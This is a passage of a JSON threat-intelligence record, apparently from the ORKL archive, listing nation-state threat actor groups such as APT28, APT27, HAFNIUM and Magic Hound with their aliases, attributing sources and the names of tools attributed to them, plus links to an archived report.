            "updated_at": "2025-03-27T02:02:10.157972Z",
            "deleted_at": null,
            "main_name": "TA428",
            "aliases": [
                "Operation LagTime IT",
                "Operation StealthyTrident",
                "ThunderCats"
            ],
            "source_name": "ETDA:TA428",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "Agent.dhwf",
                "Albaniiutas",
                "BlueTraveller",
                "Chymine",
                "Cotx RAT",
                "CoughingDown",
                "Darkmoon",
                "Destroy RAT",
                "DestroyRAT",
                "Gen:Trojan.Heur.PT",
                "Kaba",
                "Korplug",
                "LuckyBack",
                "PhantomNet",
                "PlugX",
                "Poison Ivy",
                "RedDelta",
                "RoyalRoad",
                "SManager",
                "SPIVY",
                "Sogu",
                "TIGERPLUG",
                "TManger",
                "TVT",
                "Thoper",
                "Xamtrav",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "2704d770-43b4-4bc4-8a5a-05df87416848",
            "created_at": "2022-10-25T15:50:23.306305Z",
            "updated_at": "2025-03-27T02:00:55.43633Z",
            "deleted_at": null,
            "main_name": "HAFNIUM",
            "aliases": [
                "HAFNIUM",
                "Operation Exchange Marauder",
                "Silk Typhoon"
            ],
            "source_name": "MITRE:HAFNIUM",
            "tools": [
                "Tarrask",
                "ASPXSpy",
                "Impacket",
                "PsExec",
                "China Chopper"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e3492534-85a6-4c87-a754-5ae4a56d7c8c",
            "created_at": "2022-10-25T15:50:23.819113Z",
            "updated_at": "2025-03-27T02:00:55.552554Z",
            "deleted_at": null,
            "main_name": "Threat Group-3390",
            "aliases": [
                "Threat Group-3390",
                "Earth Smilodon",
                "TG-3390",
                "Emissary Panda",
                "BRONZE UNION",
                "APT27",
                "Iron Tiger",
                "LuckyMouse"
            ],
            "source_name": "MITRE:Threat Group-3390",
            "tools": [
                "Systeminfo",
                "gsecdump",
                "PlugX",
                "ASPXSpy",
                "Cobalt Strike",
                "Mimikatz",
                "Impacket",
                "gh0st RAT",
                "certutil",
                "China Chopper",
                "HTTPBrowser",
                "Tasklist",
                "netstat",
                "SysUpdate",
                "HyperBro",
                "ZxShell",
                "RCSession",
                "ipconfig",
                "Clambling",
                "pwdump",
                "NBTscan",
                "Pandora",
                "Windows Credential Editor"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "ea34919f-9093-4e34-b9de-a37ab9b4d5c4",
            "created_at": "2022-10-25T16:07:24.35727Z",
            "updated_at": "2025-03-27T02:02:10.188555Z",
            "deleted_at": null,
            "main_name": "UNC215",
            "aliases": [],
            "source_name": "ETDA:UNC215",
            "tools": [
                "AdFind",
                "CHINACHOPPER",
                "China Chopper",
                "FOCUSFJORD",
                "HighShell",
                "HyperBro",
                "HyperSSL",
                "HyperShell",
                "Mimikatz",
                "NBTscan",
                "ProcDump",
                "PsExec",
                "SEASHARPEE",
                "SinoChopper",
                "SysUpdate",
                "TwoFace",
                "WHEATSCAN",
                "WinRAR",
                "certutil",
                "certutil.exe",
                "nbtscan"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "2c980ea7-04c4-4193-8535-52f87e66a96e",
            "created_at": "2024-05-01T02:03:07.994126Z",
            "updated_at": "2025-03-27T02:05:17.293799Z",
            "deleted_at": null,
            "main_name": "BRONZE UNION",
            "aliases": [
                "Budworm ",
                "Emissary Panda ",
                "Iron Tiger ",
                "Lucky Mouse ",
                "TG-3390 ",
                "Temp.Hippo ",
                "APT27 "
            ],
            "source_name": "Secureworks:BRONZE UNION",
            "tools": [
                " ASPXSpy",
                " China Chopper",
                " Enfal",
                " Gh0st RAT",
                " HttpBrowser",
                " Hunter",
                " HyperBro",
                " OwaAuth",
                " PlugX",
                " PoisonIvy",
                " Sysupdate",
                " ZxShell",
                "9002"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "c416260c-7ff6-4a74-a5ba-a15f40d3543f",
            "created_at": "2024-05-01T02:03:07.939268Z",
            "updated_at": "2025-03-27T02:05:17.25652Z",
            "deleted_at": null,
            "main_name": "BRONZE DUDLEY",
            "aliases": [
                "Temp.Hex ",
                "Vicious Panda ",
                "TA428 "
            ],
            "source_name": "Secureworks:BRONZE DUDLEY",
            "tools": [
                "PoisonIvy"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "4c68ccd0-caba-4189-9ead-86ac4c2d9b70",
            "created_at": "2024-05-01T02:03:07.930196Z",
            "updated_at": "2025-03-27T02:05:17.251237Z",
            "deleted_at": null,
            "main_name": "BRONZE ATLAS",
            "aliases": [
                "Axiom",
                "BARIUM ",
                "Blackfly ",
                "CTG-2633",
                "GREF",
                "Group 72 ",
                "Red Kelpie ",
                "TG-2633 ",
                "Wicked Panda ",
                "Winnti",
                "APT41 "
            ],
            "source_name": "Secureworks:BRONZE ATLAS",
            "tools": [
                " CCleaner v5.33 backdoor",
                " ChinaChopper",
                " Cobalt Strike",
                " Dicey MSDN",
                " ForkPlayground",
                " HUC Proxy Malware (Htran)",
                " Mimikatz",
                " PipeMon",
                " PlugX",
                " PortReuse",
                " Powershell Empire",
                " RCMD",
                " RbDoor",
                " SPEEDBOAT",
                " ShadowPad",
                " Sidewalk",
                " Speculoos",
                " TeamViewer",
                " Winnkit",
                " Winnti",
                " reg save",
                " vssadmin",
                "Acehash"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "c63ab035-f9f2-4723-959b-97a7b98b5942",
            "created_at": "2023-01-06T13:46:38.298354Z",
            "updated_at": "2025-03-27T02:00:02.798255Z",
            "deleted_at": null,
            "main_name": "APT27",
            "aliases": [
                "TG-3390",
                "EMISSARY PANDA",
                "TEMP.Hippo",
                "Budworm",
                "Group 35",
                "BRONZE UNION",
                "Lucky Mouse",
                "Iron Taurus",
                "GreedyTaotie",
                "Red Phoenix",
                "ZipToken",
                "Iron Tiger",
                "G0027",
                "Earth Smilodon"
            ],
            "source_name": "MISPGALAXY:APT27",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "029625d2-9734-44f9-9e10-b894b4f57f08",
            "created_at": "2023-01-06T13:46:38.364105Z",
            "updated_at": "2025-03-27T02:00:02.815023Z",
            "deleted_at": null,
            "main_name": "Charming Kitten",
            "aliases": [
                "Parastoo",
                "iKittens",
                "Group 83",
                "NewsBeef",
                "G0058",
                "CharmingCypress"
            ],
            "source_name": "MISPGALAXY:Charming Kitten",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "08a3b64c-8e18-455d-af57-28dca63808c4",
            "created_at": "2024-05-01T02:03:08.027871Z",
            "updated_at": "2025-03-27T02:05:17.313679Z",
            "deleted_at": null,
            "main_name": "COBALT ILLUSION",
            "aliases": [
                "APT42 ",
                "Charming Kitten ",
                "CharmingCypress ",
                "ITG18 ",
                "Magic Hound ",
                "Mint Sandstorm sub-group ",
                "NewsBeef ",
                "Newscaster ",
                "PHOSPHORUS sub-group ",
                "TA453 ",
                "UNC788 ",
                "Yellow Garuda ",
                "APT35 "
            ],
            "source_name": "Secureworks:COBALT ILLUSION",
            "tools": [
                " MagicHound Toolset",
                " PupyRAT",
                "Browser Exploitation Framework (BeEF)"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e3676dfe-3d40-4b3a-bfbd-4fc1f8c896f4",
            "created_at": "2022-10-25T15:50:23.808974Z",
            "updated_at": "2025-03-27T02:00:55.550912Z",
            "deleted_at": null,
            "main_name": "Magic Hound",
            "aliases": [
                "Magic Hound",
                "TA453",
                "COBALT ILLUSION",
                "Charming Kitten",
                "ITG18",
                "Phosphorus",
                "APT35",
                "Mint Sandstorm"
            ],
            "source_name": "MITRE:Magic Hound",
            "tools": [
                "Impacket",
                "CharmPower",
                "FRP",
                "Mimikatz",
                "Systeminfo",
                "ipconfig",
                "netsh",
                "PowerLess",
                "Pupy",
                "DownPaper",
                "PsExec",
                "Havij",
                "sqlmap"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "5c13338b-eaed-429a-9437-f5015aa98276",
            "created_at": "2022-10-25T16:07:23.582715Z",
            "updated_at": "2025-03-27T02:02:09.875151Z",
            "deleted_at": null,
            "main_name": "Emissary Panda",
            "aliases": [
                "APT 27",
                "ATK 15",
                "Bronze Union",
                "Budworm",
                "Earth Smilodon",
                "Emissary Panda",
                "Group 35",
                "Iron Taurus",
                "Iron Tiger",
                "LuckyMouse",
                "Operation DRBControl",
                "Operation Iron Tiger",
                "Operation PZChao",
                "Operation SpoiledLegacy",
                "Operation StealthyTrident",
                "Red Phoenix",
                "TEMP.Hippo",
                "TG-3390",
                "ZipToken"
            ],
            "source_name": "ETDA:Emissary Panda",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "Agent.dhwf",
                "AngryRebel",
                "Antak",
                "CHINACHOPPER",
                "China Chopper",
                "Destroy RAT",
                "DestroyRAT",
                "FOCUSFJORD",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HTTPBrowser",
                "HTran",
                "HUC Packet Transmit Tool",
                "HighShell",
                "HttpBrowser RAT",
                "HttpDump",
                "HyperBro",
                "HyperSSL",
                "HyperShell",
                "Kaba",
                "Korplug",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mimikatz",
                "Moudour",
                "Mydoor",
                "Nishang",
                "OwaAuth",
                "PCRat",
                "PlugX",
                "ProcDump",
                "PsExec",
                "RedDelta",
                "SEASHARPEE",
                "Sensocode",
                "SinoChopper",
                "Sogu",
                "SysUpdate",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Token Control",
                "TokenControl",
                "TwoFace",
                "WCE",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "Xamtrav",
                "ZXShell",
                "gsecdump",
                "luckyowa"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "578f8e62-2bb4-4ce4-a8b7-6c868fa29724",
            "created_at": "2022-10-25T16:07:24.344358Z",
            "updated_at": "2025-03-27T02:02:10.182282Z",
            "deleted_at": null,
            "main_name": "Tropic Trooper",
            "aliases": [
                "APT 23",
                "Bronze Hobart",
                "Earth Centaur",
                "KeyBoy",
                "Operation Tropic Trooper",
                "Pirate Panda",
                "Tropic Trooper"
            ],
            "source_name": "ETDA:Tropic Trooper",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "ByPassGodzilla",
                "CHINACHOPPER",
                "CREDRIVER",
                "China Chopper",
                "Chymine",
                "Darkmoon",
                "Gen:Trojan.Heur.PT",
                "KeyBoy",
                "Neo-reGeorg",
                "PCShare",
                "POISONPLUG.SHADOW",
                "Poison Ivy",
                "RoyalRoad",
                "SPIVY",
                "ShadowPad Winnti",
                "SinoChopper",
                "Swor",
                "TSSL",
                "USBferry",
                "W32/Seeav",
                "Winsloader",
                "XShellGhost",
                "Yahoyah",
                "fscan",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "1699fb41-b83f-42ff-a6ec-984ae4a1031f",
            "created_at": "2022-10-25T16:07:23.83826Z",
            "updated_at": "2025-03-27T02:02:09.995863Z",
            "deleted_at": null,
            "main_name": "Magic Hound",
            "aliases": [
                "APT 35",
                "Ballistic Bobcat",
                "Charming Kitten",
                "CharmingCypress",
                "Cobalt Illusion",
                "Cobalt Mirage",
                "Educated Manticore",
                "Magic Hound",
                "Mint Sandstorm",
                "Operation BadBlood",
                "Operation Sponsoring Access",
                "Operation SpoofedScholars",
                "Operation Thamar Reservoir",
                "Phosphorus",
                "TA453",
                "TEMP.Beanie",
                "Tarh Andishan",
                "Timberworm",
                "TunnelVision",
                "UNC788",
                "Yellow Garuda"
            ],
            "source_name": "ETDA:Magic Hound",
            "tools": [
                "7-Zip",
                "AnvilEcho",
                "BASICSTAR",
                "CORRUPT KITTEN",
                "CWoolger",
                "CharmPower",
                "ChromeHistoryView",
                "CommandCam",
                "DistTrack",
                "DownPaper",
                "FRP",
                "Fast Reverse Proxy",
                "FireMalv",
                "Ghambar",
                "GoProxy",
                "GorjolEcho",
                "HYPERSCRAPE",
                "Havij",
                "MPK",
                "MPKBot",
                "Matryoshka",
                "Matryoshka RAT",
                "MediaPl",
                "Mimikatz",
                "MischiefTut",
                "NETWoolger",
                "NOKNOK",
                "PINEFLOWER",
                "POWERSTAR",
                "PowerLess Backdoor",
                "PsList",
                "Pupy",
                "PupyRAT",
                "SNAILPROXY",
                "Shamoon",
                "TDTESS",
                "WinRAR",
                "WoolenLogger",
                "Woolger",
                "pupy",
                "sqlmap"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "60d96824-1767-4b97-a6c7-7e9527458007",
            "created_at": "2023-01-06T13:46:39.378701Z",
            "updated_at": "2025-03-27T02:00:03.068436Z",
            "deleted_at": null,
            "main_name": "ToddyCat",
            "aliases": [
                "Websiic"
            ],
            "source_name": "MISPGALAXY:ToddyCat",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d2516b8e-e74f-490d-8a15-43ad6763c7ab",
            "created_at": "2022-10-25T16:07:24.212584Z",
            "updated_at": "2025-03-27T02:02:10.141001Z",
            "deleted_at": null,
            "main_name": "Sofacy",
            "aliases": [
                "APT 28",
                "ATK 5",
                "Blue Athena",
                "BlueDelta",
                "FROZENLAKE",
                "Fancy Bear",
                "Fighting Ursa",
                "Forest Blizzard",
                "Grey-Cloud",
                "Grizzly Steppe",
                "Group 74",
                "GruesomeLarch",
                "ITG05",
                "Iron Twilight",
                "Operation DealersChoice",
                "Operation Dear Joohn",
                "Operation Komplex",
                "Operation Pawn Storm",
                "Operation Russian Doll",
                "Operation Steal-It",
                "Pawn Storm",
                "SIG40",
                "Sednit",
                "Snakemackerel",
                "Sofacy",
                "Strontium",
                "T-APT-12",
                "TA422",
                "TAG-0700",
                "TAG-110",
                "TG-4127",
                "Tsar Team",
                "UAC-0028",
                "UAC-0063"
            ],
            "source_name": "ETDA:Sofacy",
            "tools": [
                "ADVSTORESHELL",
                "AZZY",
                "Backdoor.SofacyX",
                "CHERRYSPY",
                "CORESHELL",
                "Carberp",
                "Computrace",
                "DealersChoice",
                "Delphacy",
                "Downdelph",
                "Downrage",
                "Drovorub",
                "EVILTOSS",
                "Foozer",
                "GAMEFISH",
                "GooseEgg",
                "Graphite",
                "HATVIBE",
                "HIDEDRV",
                "Headlace",
                "Impacket",
                "JHUHUGIT",
                "JKEYSKW",
                "Koadic",
                "Komplex",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LoJack",
                "LoJax",
                "MASEPIE",
                "Mimikatz",
                "NETUI",
                "Nimcy",
                "OCEANMAP",
                "OLDBAIT",
                "PocoDown",
                "PocoDownloader",
                "Popr-d30",
                "ProcDump",
                "PythocyDbg",
                "SMBExec",
                "SOURFACE",
                "SPLM",
                "STEELHOOK",
                "Sasfis",
                "Sedkit",
                "Sednit",
                "Sedreco",
                "Seduploader",
                "Shunnael",
                "SkinnyBoy",
                "Sofacy",
                "SofacyCarberp",
                "SpiderLabs Responder",
                "Trojan.Shunnael",
                "Trojan.Sofacy",
                "USB Stealer",
                "USBStealer",
                "VPNFilter",
                "Win32/USBStealer",
                "WinIDS",
                "Winexe",
                "X-Agent",
                "X-Tunnel",
                "XAPS",
                "XTunnel",
                "Xagent",
                "Zebrocy",
                "Zekapab",
                "carberplike",
                "certutil",
                "certutil.exe",
                "fysbis",
                "webhp"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716503,
    "ts_updated_at": 1743041831,
    "ts_creation_date": 1644858447,
    "ts_modification_date": 1644858551,
    "files": {
        "pdf": "https://archive.orkl.eu/957289a738576160892bcaca22df777d63d586ed.pdf",
        "text": "https://archive.orkl.eu/957289a738576160892bcaca22df777d63d586ed.txt",
        "img": "https://archive.orkl.eu/957289a738576160892bcaca22df777d63d586ed.jpg"
    }
}